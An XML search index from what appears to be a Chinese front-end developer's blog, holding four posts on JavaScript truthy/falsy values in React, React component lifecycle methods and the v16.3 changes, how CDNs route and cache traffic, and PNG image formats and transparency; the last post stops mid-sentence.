<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[JS的truthy和falsy🎄]]></title>
      <url>%2F2018%2F05%2F10%2F56%2F</url>
      <content type="text"><![CDATA[在看react教程的时候，突然看到下面这段话: 在有条件性渲染 React 元素时非常有用。如果 showHeader 为 true 时，会被渲染: 1234&lt;div&gt; &#123;showHeader &amp;&amp; &lt;Header /&gt;&#125; &lt;Content /&gt;&lt;/div&gt; 需要注意的是“falsy”值，例如数值 0 ，仍然会被 React 渲染。例如，这段代码不会按照你预期的发生，因为当 props.messages 是一个空数组时 0 会被打印：12345&lt;div&gt; &#123;props.messages.length &amp;&amp; &lt;MessageList messages=&#123;props.messages&#125; /&gt; &#125;&lt;/div&gt; 引自:react中文第一次看到truthy和falsy的说法。随机去查了下truthy和falsy。 JavaScript中存在Truthy值和Falsy值的概念 — 除了boolean值true、false外，所有类型的JavaScript值均可用于逻辑判断，其规则如下： Falsy值，当进行逻辑判断时均为false(如!!false==false)。六个Falsy值：false、undefined、null、正负0、NaN、””。 其余所有的值均为Truthy，当进行逻辑判断时均为true（如!![]==true）。Infinity、空数组、”0″都是Truthy值。也就是说false是属于falsy的，任何 真是学无止境，之前在做react项目的时候，会碰到用0去判断，就会出现明明是0，按理说应该是false的条件，但是还是渲染出来了，现在知道了，原来0是falsy，和false还是有区别的，而且react遇到falsy还是可以渲染的，一定要是false才可以。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[我所知道的es6种react生命周期]]></title>
      <url>%2F2018%2F05%2F09%2F55%2F</url>
      <content type="text"><![CDATA[基本上所有的React组件的生命周期方法都可以被分割成四个阶段：初始化、挂载阶段（mounting）、更新阶段、卸载阶段（unmounting）。让我们来看一下各个阶段。 初始化阶段es6中我们用下面方法来分别定义this.props默认值和this.state的初始值阶段12345678910constructor(props) &#123; super(props) this.pageSize = 1 this.rowWidth = 300 this.container = null&#125;static propTypes = &#123; list: PropTypes.array, fetchCallHistory: PropTypes.func,&#125; 仅当存在constructor的时候必须调用super，如果没有，则不用如果在你声明的组件中存在constructor，则必须要加super，举个栗子：12345class MyClass extends React.component &#123; render()&#123; return &lt;div&gt;Hello &#123; this.props.world &#125;&lt;/div&gt;; &#125;&#125; 这段代码是没有问题的，我们不需要去调用super，然而，如果在代码中存在consturctor，那必须调用：123456class MyClass extends React.component &#123; constructor()&#123; console.log(this) //Error: &apos;this&apos; is not allowed before super() &#125;&#125; 之所以会报错，是因为若不执行super，则this无法初始化。也就是说，在ES6中的class语法中，有constructor就得有super（当然，子类也可以没有constructor） 仅当你想在constructor内使用props才将props传入super。React会自行props设置在组件的其他地方（以供访问）。将props传入super的作用是可以使你在constructor内访问它：1234567 class MyClass extends React.component&#123; constructor(props)&#123; super(); console.log(this.props); // this.props is undefined &#125;&#125; 完善后：1234567class MyClass extends React.component&#123; constructor(props)&#123; super(props); console.log(this.props); // prints out whatever is inside props &#125;&#125; 如果你只是想在别处访问它，是不必传入props的，因为React会自动为你设置好：123456789101112class MyClass extends React.component&#123; render()&#123; // There is no need to call `super(props)` or even having a constructor // this.props is automatically set for you by React // not just in render but another where else other than the constructor console.log(this.props); // it works! &#125;&#125; 挂载阶段componentWillMount即将挂载。组件初始化阶段，dom还没有渲染到html文档里面。该方法在完成首次渲染之前被调用，这也是在render方法调用前可以修改组件state的最后一次机会。此阶段修改state不会引发渲染。在此期间一般不调用ajax，如果调用，相当于同步触发。 render挂载阶段。组件实例化时在componentWillMount执行完成后就会被执行。react最重要的步骤，创建虚拟dom，进行diff算法，更新dom树都在此进行。此时就不能更改state了，如果用setState方法，会引起无限的报错。 componentDidMount挂载完成。在子组件也都加载完毕后执行，在RN中就是指组件初始化加载完毕，在react中DOM渲染完成，此时就可以操作DOM了。 更新阶段componentWillReceiveProps当传递给组件的props发生改变时，组件的componentWillReceiveProps即会被触发调用，方法传递的参数的是发更更改的之后的props值（通常我们命名为nextProps）。在这个方法里，你可以通过this.props访问当前的属性值，可以通过nextProps访问即将更新的属性值，或者将它们进行对比，或者将它们进行计算，最终确定你需要更新的状态（state）并最终调用setState方法对状态进行更新。在这个钩子函数中调用setState方法并不会触发再一次渲染。但是每次变化，react不会去验证新旧props是否发生改变，所以如果需要在变化时做一些事情，务必要手动的进行比较。 shouldComponentUpdate(nextProps, nextState)我们上面刚刚说过，React并不会对props进行深度比较，这对state也同样适用。所以即使props与state并未发生了更改，shouldComponentUpdate也会被再次调用，包括接下来的步骤componentWillUpdate、render、componentDidUpdate也都会再次运行一次。这很明显会给性能造成不小的伤害。所以这是react性能优化非常重要的一环。组件接受新的state或者props时调用，我们可以设置在此对比前后两个props和state是否相同，如果相同则返回false阻止更新，因为相同的属性状态一定会生成相同的dom树，这样就不需要创造新的dom树和旧的dom树进行diff算法对比，节省大量性能，尤其是在dom结构复杂的时候。此方法返回一个布尔值，且默认是true。但是我们也可以返回false，这样下面的（生命周期）方法将不会被调用： componentWillUpdate() render() componentDidUpdate()123456789shouldComponentUpdate(nextProps, nextState) &#123; if (!_.isEqual(this.props, nextProps) || !_.isEqual(this.state,nextState)) &#123; return true &#125; else &#123; return false &#125;&#125;或者使用PureComponent。PureComponent使用的是浅拷贝对比，复杂的数据类型可能存在对不不出来的情况。 .isEqual和.isEmpty是 lodash 插件里面的函数 componentWillUpdate(nextProps, nextState)componentWillUpdate在props或state改变或shouldComponentUpdate返回true后触发。不可在其中使用setState。 componentDidUpdate在React更新DOM之后立刻被调用。可以在此方法里操作被更新过的DOM或者执行一些后置动作（action）。此方法有两个参数： prevProps：旧的属性 prevState：旧的state除和Mount阶段类似，当组件进入componentDidUpdate阶段时意味着最新的原生DOM已经渲染完成并且可以通过refs进行访问。该函数会传入两个参数，分别是prevProps和prevState，顾名思义是之前的状态。你仍然可以通过this关键字访问当前的状态，因为可以访问原生DOM的关系，在这里也适用于做一些第三方需要操纵类库的操作。update阶段各个钩子函数的调用顺序也与mount阶段相似，尤其是componentDidUpdate，子组件的该钩子函数优先于父组件调用因为可以访问DOM的缘故，我们有可能需要在这个钩子函数里获取实际的元素样式，并且写入state中，比如你的代码可能会长这样：12345componentDidUpdate(prevProps, prevState) &#123;// BAD: DO NOT DO THIS!!! let height = ReactDOM.findDOMNode(this).offsetHeight; this.setState(&#123; internalHeight: height &#125;);&#125; 如果默认情况下你的shouldComponentUpdate()函数总是返回true的话，那么这样在componentDidUpdate里更新state的代码又会把我们带入无限render的循环中。如果你必须要这么做，那么至少应该把上一次的结果缓存起来，有条件的更新state:1234567componentDidUpdate(prevProps, prevState) &#123; // One possible fix... let height = ReactDOM.findDOMNode(this).offsetHeight; if (this.state.height !== height ) &#123; this.setState(&#123; internalHeight: height &#125;); &#125;&#125; 注意:在shouldComponentUpdate和componentwillUpdate中切勿使用setState方法，会导致循环调用。这是因为如果在shouldComponentUpdate和componentWillUpdate中调用了setState，此时this._pendingStateQueue != null，则performUpdateIfNecessary方法就会调用updateComponent方法进行组件更新。但是updateComponent方法又会调用shouldComponentUpdate和componentWillUpdate，因此造成循环调用，使得浏览器内存占满后崩溃。(this._pendingElement != null) &#123;1234567 ReactReconciler.receiveComponent(this, this._pendingElement, transaction, this._context); &#125; else if (this._pendingStateQueue !== null || this._pendingForceUpdate) &#123; this.updateComponent(transaction, this._currentElement, this._currentElement, this._context, this._context); &#125; else &#123; this._updateBatchNumber = null; &#125;&#125; 当从父组件接收到新的属性时： 当通过this.setState( )改变状态时： 卸载阶段componentWillUnmount当组件需要从DOM中移除时，即会触发这个钩子函数。这里没有太多需要注意的地方，在这个函数中通常会做一些“清洁”相关的工作 将已经发送的网络请求都取消掉移除组件上DOM的Event Listener React v16.3 版本新生命周期函数浅析一个月前，React 官方正式发布了 v16.3 版本。新增了 Context API ， getDerivedStateFromProps，getSnapshotBeforeUpdate的两个生命周期函数。提出在未来 v17.0 版本中即将移除三个生命周期函数 componentWillMount，componentWillReceiveProps，componentWillUpdate。 Context API现在 react + redux 已经成为了开始一个 React 项目标配，其实 react 本身是可以使用 state 和 props 来管理数据的，如果对 redux 的不正确使用，可能会增加应用整体的复杂度及代码量。新旧Context解决的都是prop drilling问题，旧的context存在一些问题，如果某个组件shouldComponentUpdate返回的是false，那么就不会再继续执行。新的context api 采用声明式的写法，并且可以透过shouldComponentUpdate返回false的组件继续向下传播，以保证目标组件可以接收到顶层组件context值的更新。新的context api 分为三个部分： React.createContext 用于初始化一个Context XXXContext.Provider作为顶层组件接收一个名为的value的prop,可以接收任意需要被放入Context 的字符串，数字，甚至是函数 XXXContext.Consumer作为目标组件可以出现在组件树的任意位置(在Provider之后)，接收children prop，这里的children必须是一个函数(context=&gt;())用来接收顶层传来的context componentWillReceiveProps 更新由 props 决定的 state 及处理特定情况下的回调在老版本的 React 中，如果组件自身的某个 state 跟其 props 密切相关的话，一直都没有一种很优雅的处理方式去更新 state，而是需要在 componentWillReceiveProps 中判断前后两个 props 是否相同，如果不同再将新的 props 更新到相应的 state 上去。这样做一来会破坏 state 数据的单一数据源，导致组件状态变得不可预测，另一方面也会增加组件的重绘次数。类似的业务需求也有很多，如一个可以横向滑动的列表，当前高亮的 Tab 显然隶属于列表自身的状态，但很多情况下，业务需求会要求从外部跳转至列表时，根据传入的某个值，直接定位到某个 Tab。在新版本中，React 官方提供了一个更为简洁的生命周期函数：1static getDerivedStateFromProps(nextProps, prevState) 一个简单的例子如下：123456789101112131415161718// beforecomponentWillReceiveProps(nextProps) &#123; if (nextProps.translateX !== this.props.translateX) &#123; this.setState(&#123; translateX: nextProps.translateX, &#125;); &#125; &#125;// afterstatic getDerivedStateFromProps(nextProps, prevState) &#123; if (nextProps.translateX !== prevState.translateX) &#123; return &#123; translateX: nextProps.translateX, &#125;; &#125; return null;&#125; 乍看下来这二者好像并没有什么本质上的区别,但是可以看出React 团队试图通过框架级别的 API 来约束或者说帮助开发者写出可维护性更佳的JavaScript代码。1234567891011// beforecomponentWillReceiveProps(nextProps) &#123; if (nextProps.isLogin !== this.props.isLogin) &#123; this.setState(&#123; isLogin: nextProps.isLogin, &#125;); &#125; if (nextProps.isLogin) &#123; this.handleClose(); &#125;&#125; 1234567891011121314// afterstatic getDerivedStateFromProps(nextProps, prevState) &#123; if (nextProps.isLogin !== prevState.isLogin) &#123; return &#123; isLogin: nextProps.isLogin, &#125;; &#125; return null;&#125;componentDidUpdate(prevProps, prevState) &#123; if (!prevState.isLogin &amp;&amp; this.props.isLogin) &#123; this.handleClose(); &#125; 通常来讲，在 componentWillReceiveProps 中，我们一般会做以下两件事，一是根据 props 来更新 state，二是触发一些回调，如动画或页面跳转等。在老版本的 React 中，这两件事我们都需要在 componentWillReceiveProps 中去做。而在新版本中，官方将更新 state 与触发回调重新分配到了 getDerivedStateFromProps 与 componentDidUpdate 中，使得组件整体的更新逻辑更为清晰。而且在 getDerivedStateFromProps 中还禁止了组件去访问 this.props，强制让开发者去比较 nextProps 与 prevState 中的值，以确保当开发者用到 getDerivedStateFromProps 这个生命周期函数时，就是在根据当前的 props 来更新组件的 state，而不是去做其他一些让组件自身状态变得更加不可预测的事情。 在组件更新前读取 DOM 元素状态另一个常见的 componentWillUpdate 的用例是在组件更新前，读取当前某个 DOM 元素的状态，并在 componentDidUpdate 中进行相应的处理。但在 React 开启异步渲染模式后，render 阶段和 commit 阶段之间并不是无缝衔接的，也就是说在 render 阶段读取到的 DOM 元素状态并不总是和 commit 阶段相同，这就导致在componentDidUpdate 中使用 componentWillUpdate 中读取到的 DOM 元素状态是不安全的，因为这时的值很有可能已经失效了或者 DOM 可能因为用户行为发生了变化。为了解决上面提到的这个问题，React 提供了一个新的生命周期函数：1getSnapshotBeforeUpdate(prevProps, prevState) 与 componentWillUpdate 不同，getSnapshotBeforeUpdate 会在最终的 render 之前被调用，也就是说在 getSnapshotBeforeUpdate 中读取到的 DOM 元素状态是可以保证与 componentDidUpdate 中一致的。虽然 getSnapshotBeforeUpdate 不是一个静态方法，但我们也应该尽量使用它去返回一个值。这个值会随后被传入到 componentDidUpdate 中，然后我们就可以在 componentDidUpdate 中去更新组件的状态，而不是在 getSnapshotBeforeUpdate 中直接更新组件状态。官方提供的一个例子如下：12345678910111213141516171819202122232425262728293031class ScrollingList extends React.Component &#123; listRef = null; getSnapshotBeforeUpdate(prevProps, prevState) &#123; if (prevProps.list.length &lt; this.props.list.length) &#123; return ( this.listRef.scrollHeight - this.listRef.scrollTop ); &#125; return null; &#125; componentDidUpdate(prevProps, prevState, snapshot) &#123; if (snapshot !== null) &#123; this.listRef.scrollTop = this.listRef.scrollHeight - snapshot; &#125; &#125; render() &#123; return ( &lt;div ref=&#123;this.setListRef&#125;&gt; &#123;/* ...contents... */&#125; &lt;/div&gt; ); &#125; setListRef = ref =&gt; &#123; this.listRef = ref; &#125;;&#125; 升级方案将现有的 componentWillUpdate 中的回调函数迁移至 componentDidUpdate。如果触发某些回调函数时需要用到 DOM 元素的状态，则将对比或计算的过程迁移至 getSnapshotBeforeUpdate，然后在 componentDidUpdate 中统一触发回调或更新状态。 小结让我们从整体的角度再来看一下 React 这次生命周期函数调整前后的异同：beforeafter 在第一张图中被红框圈起来的三个生命周期函数就是在新版本中即将被移除的。通过上述的两张图，我们可以清楚地看到将要被移除的三个生命周期函数都是在 render 之前会被调用到的。而根据原来的设计，在这三个生命周期函数中都可以去做一些诸如发送请求，setState 等包含副作用的事情。在老版本的 React 中，这样做也许只会带来一些性能上的损耗，但在 React 开启异步渲染模式之后，就无法再接受这样的副作用产生了。举一个 Git 的例子就是在开发者 commit 了 10 个文件更新后，又对当前或其他的文件做了另外的更新，但在 push 时却仍然只 push 了刚才 commit 的 10 个文件更新。这样就会导致提交记录与实际更新不符，如果想要避免这个问题，就需要保证每一次的文件更新都要经过 commit 阶段，再被提交到远端，而这也就是 React 在开启异步渲染模式之后要做到的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CDN技术原理💕]]></title>
      <url>%2F2016%2F07%2F26%2F54%2F</url>
      <content type="text"><![CDATA[要了解CDN的实现原理，首先让我们来回顾一下网站传统的访问过程，以便理解其与CDN访问方式之间的差别：由上图可见，传统的网站访问过程为: 用户在浏览器中输入要访问的域名； 浏览器向域名解析服务器发出解析请求，获得此域名对应的IP地址； 浏览器利用所得到的IP地址，向该IP对应的服务器发出访问请求； 服务器对此响应，将数据回传至用户浏览器端显示出来。 与传统访问方式不同，CDN网络则是在用户和服务器之间增加Cache层，将用户的访问请求引导到Cache节点而不是服务器源站点，要实现这一目的，主要是通过接管DNS实现，下图为使用CDN缓存后的网站访问过程：由上图可见，使用CDN缓存后的网站访问过程演变为： 用户在浏览器中输入要访问的域名； 浏览器向域名解析服务器发出解析请求，由于CDN对域名解析过程进行了调整，所以用户端一般得到的是该域名对应的CNAME记录，此时浏览器需要再次对获得的CNAME域名进行解析才能得到缓存服务器实际的IP地址。注：在此过程中，全局负载均衡DNS解析服务器会根据用户端的源IP地址，如地理位置（深圳还是上海）、接入网类型（电信还是网通）将用户的访问请求定位到离用户路由最短、位置最近、负载最轻的Cache节点（缓存服务器）上，实现就近定位。定位优先原则可按位置、可按路由、也可按负载等。 再次解析后浏览器得到该域名CDN缓存服务器的实际IP地址，向缓存服务器发出访问请求； 缓存服务器根据浏览器提供的域名，通过Cache内部专用DNS解析得到此域名源服务器的真实IP地址，再由缓存服务器向此真实IP地址提交访问请求； 缓存服务器从真实IP地址得到内容后，一方面在本地进行保存，以备以后使用，同时把得到的数据发送到客户端浏览器，完成访问的响应过程； 用户端得到由缓存服务器传回的数据后显示出来，至此完成整个域名访问过程。 通过以上分析可以看到，不论是否使用CDN网络，普通用户客户端设置不需做任何改变，直接使用被加速网站原有域名访问即可。对于要加速的网站，只需修改整个访问过程中的域名解析部分，便能实现透明的网络加速服务。 Linux 系统 Squid集群做CDN全网加速内容分发网络(CDN)是一种新型网络内容服务体系，其基于IP网络而构建，基于内容访问与应用的效率要求、质量要求和内容秩序而提供内容的分发和服务。而从广义的角度，CDN代表了一种基于网络而构建的高质量、高效率、具有鲜明网络秩序的网络应用服务模式。简单地说，内容分发网络(CDN)是一个经策略性部署的整体系统，包括分布式存储、负载均衡、网络请求的重定向和内容管理4个要件，而内容管理和全局的网络流量管理(Traffic Management)是CDN的核心所在。通过用户就近性和服务器负载的判断，CDN确保内容以一种极为高效的方式为用户的请求提供服务。总的来说，内容服务基于缓存服务器，也称作代理缓存(Surrogate)，它位于网络的边缘，距用户仅有”一跳”(Single Hop)之遥。同时，代理缓存是内容提供商源服务器（通常位于CDN服务提供商的数据中心）的一个透明镜像。这样的架构使得CDN服务提供商能够代表他们客户，即内容供应商，向最终用户提供尽可能好的体验，而这些用户是不能容忍请求响应时间有任何延迟的。CDN的通俗理解就是网站加速，可以解决跨运营商，跨地区，服务器负载能力过低，带宽过少等带来的网站打开速度慢等问题。比如： 一个企业的网站服务器在北京，运营商是电信，在广东的联通用户访问企业网站时，因为跨地区，跨运营商的原因，网站打开速度就会比北京当地的电信客户访问速度慢很多，很容易造成这个企业的客户流失 一个网站的服务器性能比较差，承载能力有限，有时面临突发流量，招架不住，直接导致服务器崩溃，网站打不开，尤其是电商网站在节日期间，因为这种情况网站打不开，销售额白白流失的占比都高涨至60% 再比如一些中小企业租用的虚拟主机，因为跟好几个网站共用一台服务器，每个网站所分带宽有限，带宽过小经常导致流量稍微一多，网站打开速度就很慢，甚至打不开 以上只是几个简单举例，都可以通过CDN来解决，大家可以参考下。使用CDN的好处？ 不用担心自己网站访客，在任何时间，任何地点，任何网络运营商，都能快速打开网站。 各种服务器虚拟主机带宽等采购成本，包括后期运维成本都会大大减少。 给网站直接带来的好处就是：流量，咨询量，客户量，成单量，都会得到大幅度提升。 CDN的价格？大家提起CDN,都会望而却步，因为CDN太贵，都是大企业才能用得起的贵族式服务，而如今面对中小企业的CDN技术开发已经实现，并进入市场开始运营。现在市面上CDN提供商计费方式多样，有按每月最低消费的，有按带宽收费的，有按请求数收费的，有包月包季包年限制的，还有些大多人看不懂的技术指标收费的，总之比较复杂，CDN服务在所有计费方式中，中小企业一至认为按流量收费最为合理，另外大多按流量计费方式中会有时间限制，规定时间内用不完就会全部作废，对于流量把握不好的中小企业，存在相当一部分浪费。 CDN选择的标准？因为CDN技术牵涉到技术研发，以及售后问题解决的是否快捷，所以在选择cdn服务商时，一定选择技术研发实力强专业的公司，以保证在售后出现问题时能得到及时的解决，而不能仅仅图便宜，当时是便宜了，可事后会用更大的金钱代价来弥补，所以请选择CDN服务的企业网站，一定要慎重了，尤其是中小企业，更经不起折腾。由于cdn市场很混乱，付完钱，出问题售后跟不上的案例太多了，大家在选择时还是选择专业的CDN服务商为上策，不要只图便宜，对于专业的CDN提供商已经很便宜了。在CDN业界国内可供中小企业选择的CDN专业提供商有：Webluker,盛大云，叁加伍,加速乐等，大家可以在网上搜搜，到他们官网看看，按照上面的标准进行选择，应该没什么问题。首先简单表述一下传统的动态系统的访问方法：表述的是用户的请求过程，用户经过网络中的路由A、B的传输，最终将发送的请求交于动态系统来处理，但是由于IP网络本身的“尽力而为的原则”、网络链路中复杂的环境及硬件的不可靠性的确实存在，致使用户要出现重复发送的请求的现状，所以最终导致用户的请求在提交的过程中出现等待、数据加载时间过长的一些现象的普遍存在，这些在线提交式系统的缓慢直接地影响到办公人员的工作效率，这也是制约着很多大型企业在协同办公OA、ERP、SAP等信息化建设中，出现最多的问题。而CDN分发解决方案解决了与静态网站相关的性能和可靠性问题，而在当今在线业务体验中，与分发静态和动态元素和应用相关的独特挑战，则由速网的动态网站加速（动态网站加速）来解决 工作原理在描述CDN的实现原理，让我们先看传统的未加缓存服务的访问过程，以便了解CDN缓存访问方式与未加缓存访问方式的差别：[3]由上图可见，用户访问未使用CDN缓存网站的过程为: 用户向浏览器提供要访问的域名； 浏览器调用域名解析函数库对域名进行解析，以得到此域名对应的IP地址； 浏览器使用所得到的IP地址，域名的服务主机发出数据访问请求； 浏览器根据域名主机返回的数据显示网页的内容。 通过以上四个步骤，浏览器完成从用户处接收用户要访问的域名到从域名服务主机处获取数据的整个过程。CDN网络是在用户和服务器之间增加Cache层，如何将用户的请求引导到Cache上获得源服务器的数据，主要是通过接管DNS实现，下面让我们看看访问使用CDN缓存后的网站的过程：流程图通过上图，我们可以了解到，使用了CDN缓存后的网站的访问过程变为： 用户向浏览器提供要访问的域名； 浏览器调用域名解析库对域名进行解析，由于CDN对域名解析过程进行了调整，所以解析函数库一般得到的是该域名对应的CNAME记录，为了得到实际IP地址，浏览器需要再次对获得的CNAME域名进行解析以得到实际的IP地址；在此过程中，使用的全局负载均衡DNS解析，如根据地理位置信息解析对应的IP地址，使得用户能就近访问。 此次解析得到CDN缓存服务器的IP地址，浏览器在得到实际的IP地址以后，向缓存服务器发出访问请求； 缓存服务器根据浏览器提供的要访问的域名，通过Cache内部专用DNS解析得到此域名的实际IP地址，再由缓存服务器向此实际IP地址提交访问请求； 缓存服务器从实际IP地址得得到内容以后，一方面在本地进行保存，以备以后使用，二方面把获取的数据返回给客户端，完成数据服务过程； 客户端得到由缓存服务器返回的数据以后显示出来并完成整个浏览的数据请求过程。 通过以上的分析我们可以得到，为了实现既要对普通用户透明(即加入缓存以后用户客户端无需进行任何设置，直接使用被加速网站原有的域名即可访问)，又要在为指定的网站提供加速服务的同时降低对ICP的影响，只要修改整个访问过程中的域名解析部分，以实现透明的加速服务，下面是CDN网络实现的具体操作过程。 作为ICP，只需要把域名解释权交给CDN运营商，其他方面不需要进行任何的修改；操作时，ICP修改自己域名的解析记录，一般用cname方式指向CDN网络Cache服务器的地址。 作为CDN运营商，首先需要为ICP的域名提供公开的解析，为了实现sortlist，一般是把ICP的域名解释结果指向一个CNAME记录； 当需要进行sorlist时，CDN运营商可以利用DNS对CNAME指向的域名解析过程进行特殊处理，使DNS服务器在接收到客户端请求时可以根据客户端的IP地址，返回相同域名的不同IP地址； 由于从cname获得的IP地址，并且带有hostname信息，请求到达Cache之后，Cache必须知道源服务器的IP地址，所以在CDN运营商内部维护一个内部DNS服务器，用于解释用户所访问的域名的真实IP地址； 在维护内部DNS服务器时，还需要维护一台授权服务器，控制哪些域名可以进行缓存，而哪些又不进行缓存，以免发生开放代理的情况。 在国内访问量较高的大型网站如新浪、网易等，均使用CDN网络加速技术，虽然网站的访问巨大，但无论在什么地方访问都会感觉速度很快。而一般的网站如果服务器在网通，电信用户访问很慢，如果服务器在电信，网通用户访问又很慢。它采取了分布式网络缓存结构（即国际上流行的web cache技术），通过在现有的Internet中增加一层新的网络架构，将网站的内容发布到最接近用户的cache服务器内，通过DNS负载均衡的技术，判断用户来源就近访问cache服务器取得所需的内容，解决Internet网络拥塞状况，提高用户访问网站的响应速度，如同提供了多个分布在各地的加速器，以达到快速、可冗余的为多个网站加速的目的。CDN服务最初用于确保快速可靠地分发静态内容，这些内容可以缓存，最适合在网速庞大的网络中存储和分发，该网络在几十多个国家的十几个网络中的覆盖CDN网络服务器。由于动态内容必须通过互联网来传输，因此要提供快速的网络体验，以满足当今用户的要求，只能通过对互联网流量的独特视角来达到。必须使用先进技术来了解通过互联网的最佳路由，充分利用这些最佳路由，加速通过互联网协议的数据通讯,以改善用户的网络体验。 本地Cache加速 提高了企业站点（尤其含有大量图片和静态页面站点）的访问速度，并大大提高以上性质站点的稳定性 镜像服务 消除了不同运营商之间互联的瓶颈造成的影响，实现了跨运营商的网络加速，保证不同网络中的用户都能得到良好的访问质量。 远程加速远程访问用户根据DNS负载均衡技术智能自动选择Cache服务器，选择最快的Cache服务器，加快远程访问的速度 带宽优化 自动生成服务器的远程Mirror（镜像）cache服务器，远程用户访问时从cache服务器上读取数据，减少远程访问的带宽、分担网络流量、减轻原站点WEB服务器负载等功能。 集群抗攻击 广泛分布的CDN节点加上节点之间的智能冗余机制，可以有效地预防黑客入侵以及降低各种D.D.o.S攻击对网站的影响，同时保证较好的服务质量 。 关键技术 内容发布：它借助于建立索引、缓存、流分裂、组播（Multicast）等技术，将内容发布或投递到距离用户最近的远程服务点（POP）处； 内容路由：它是整体性的网络负载均衡技术，通过内容路由器中的重定向（DNS）机制，在多个远程POP上均衡用户的请求，使得用户请求得到最快内容源的响应； 内容交换：它根据内容的可用性、服务器的可用性以及用户的背景，在POP的缓存服务器上，利用应用层交换、流分裂、重定向（ICP、WCCP）等技术，智能地平衡负载流量； 性能管理：它通过内部和外部监控系统，获取网络部件的状况信息，测量内容发布的端到端性能（如包丢失、延时、平均带宽、启动时间、帧速率等），保证网络处于最佳的运行状态。 CDN能几乎涵盖国内所有线路。而在可靠性上， CDN 在结构上实现了多点的冗余，即使某一个节点由于意外发生故障，对网站的访问能够被自动导向其他的健康节点进行响应。CDN能轻松实现网站的全国铺设，不必考虑服务器的投入与托管、不必考虑新增带宽的成本、不必考虑多台服务器的镜像同步、不必考虑更多的管理维护技术人员。加速乐免费CDN是由加速乐推出的免费CDN平台，通过加速乐免费CDN可以有效提高网站访问速度200%以上，提高网站访问量19%以上，保护网站安全。加速乐已经在全国各地区布设了数台加速节点，用户网站在使用加速后，在有访客访问时，加速乐智能DNS将优先选择最快最优的节点分配给用户，直接从加速乐节点海量数据库缓存将数据返回给用户，通过使用加速乐，83%以上的网页可以在1秒以内打开，99%以上网站可以在8秒以内打开。 转自：http://www.cnblogs.com/flymolgee/articles/4331784.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[关于Png格式图片你了解多少😃]]></title>
      <url>%2F2016%2F07%2F25%2F53%2F</url>
      <content type="text"><![CDATA[Png是图像文件存储格式，在网页设计中已经不是一个陌生的名词，在前端开发中经常使用到它，如常用CSS雪碧图。而Png的使用不仅仅如此，Png有多少种格式，有哪些特点，PC端中常用的Png格式是哪些，手机端最合适的Png格式是什么呢?如果你对这些问题有疑问，那么很开心的告诉你，这里有你需要的答案。 PNG的格式和透明度这个Fireworks会比较清楚，打开Fireworkd优化面板，可以清楚看到png有3种不同深度的格式：png8、png24、png32。其中，在优化面板选择png8，可发现png8包括不透明、索引色透明、alpha透明3种格式。 PNG88位的png最多支持256(2的8次方)种颜色，8位的png其实8支持不透明、索引透明、alpha透明。 PNG24支持2的24次方种颜色，表现为不透明。 PNG32支持2的32次方种颜色，32位是我们最常使用的格式，它是在png在24位的png基础上增加了8位的透明信息，支持不同程度的半透效果。其实PNG8的3种格式不透明、索引透明、alpha透明，正好把png的所有格式都归类好了：『png不透明』格式『png索引透明』格式『pngalpha透明』格式 『PNG不透明』格式说到不透明，就像jpg格式一样，『png不透明』只能为不透明，代表格式有：『png8不透明』和『png24』，导出软件有：Photoshop、Fireworks。不推荐使用『png不透明』格式，建议用jpg图片来代替它。可能会有同学会问为什么png24是不透明的，我使用photoshop导出来的就是png24啊? Png24实际为不透明图片打开photoshop，任意打开一个带透明的psd文件，存储为web所有格式(ctrl+shift+alt+s)，如下面板所示：勾选透明度单选框，图片的透明背景会被默认的白色填充导出来的png图片深度为24位，图片为不透明，表现跟jpg图片相似如果勾选了透明度(alpha通道)，导出深度为32位的透明图片从photoshop存储为web所有格式面板中这样理解，png24深度其实为24位，再勾选上8位的alhpa通道，24+8=32，即『png32』=『png24+alpha』，这也许是photoshop软件开发者不添加png32位格式的原因，下图为Photoshop存储为web所有格式界面的图片格式选择，并没有png32位的选项~ 『PNG索引透明』格式说到索引颜色透明，我们可以了解下什么是索引颜色，『png索引透明』代表格式有『png8索引透明』,导出软件有：Photoshop、Fireworks，它的特点总结如下：挑选一副图片中最有代表性的若干种颜色(通常不超过256种)只能为不透明或全透明文件体积小带有杂边锯齿支持IE6如何使用Photoshop导出『png8索引透明』使用Photoshop，存储为web所有格式，按照如下图片的红色边框配置，可导出png8索引透明注：使用Photoshop导出『png8索引透明』的效果比Fireworks导出的效果良好，这里不介绍使用Fireworks导出『png8索引透明』 png8索引透明』产生杂边锯齿原因『png8索引透明』只有透明索引颜色，没有半透明索引颜色，下图左侧为带半透明像素的图片，在浏览器中打开不会有锯齿，而右侧图片为全透明或不透明的像素，在浏览器打开后有锯齿。由于『png8索引透明』没有半透明索引颜色，使用Photoshop导出时，原有的半透明转化为不透明，从而产生锯齿。 如何避免『png8索引透明』的杂边锯齿方法：设置杂边与背景色颜色一致可达到视觉上透明。相信不难理解，利用杂边与背景色一致，可以来满足视觉上的透明，缺点是只能适应一种背景色，在其它背景色下同样会产生杂边。怎么设置呢，打开Photoshop，在存储为web格式面板中进行如下操作，在杂边选项中选择与背景色一致的颜色。 『PNGAlpha透明』格式说到alpha透明，我们可以了解下什么是alpha通道，『pngalpha透明』代表格式有『png8alpha透明』和『png32』，导出软件有Fireworks，它的特点总结如下：一个8位的灰度通道，该通道用256级灰度来记录图像中的透明度信息，定义透明、不透明和半透明区域支持全透明和半透明『Png8alpha透明』文件体积小『Png8alpha透明』在IE6下有毛边 如何使用Fireworks导出『png8alpha透明』Firewoks中，在优化面板，按照如下图片的红色边框配置，可导出png8alpha透明。注：Firewoks支持导出『png8alpha透明』，Photoshop不支持导出『png8alpha透明』 手机端选择哪种Png说到手机，考虑流量的问题是必不可少的，所选png需要满足体积小和视觉效果良好，那么哪种png格式符合这2个要求呢?做个实验吧~ 